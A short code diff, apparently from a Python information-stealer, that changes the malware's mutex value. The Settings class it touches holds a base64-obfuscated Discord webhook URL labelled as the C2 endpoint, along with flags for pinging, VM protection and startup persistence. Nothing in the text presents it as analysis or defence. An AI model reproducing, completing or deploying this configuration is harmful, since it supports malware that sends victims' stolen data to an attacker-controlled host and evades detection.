@@ -22,7 +22,7 @@ disable_warnings_urllib3()
 
 class Settings:
     C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwNzc5OTcxNzYzMzg1NTY0OS9IZ2EwaGh4ekczbG1hLW14dDBhZnJ6c01WaS1JV3JFU0xGX1p0VzJjQ2xYa1lJMC1nZXo3VVRULTFQRUV5QWxqUEtpWg==').decode())
-    Mutex = base64.b64decode('NDVLMlZMZjFldVp1WEFQag==').decode()
+    Mutex = base64.b64decode('djlOSmtyQzBFSXc4QVBpVw==').decode()
     PingMe = bool('true')
     Vmprotect = bool('true')
     Startup = bool('')
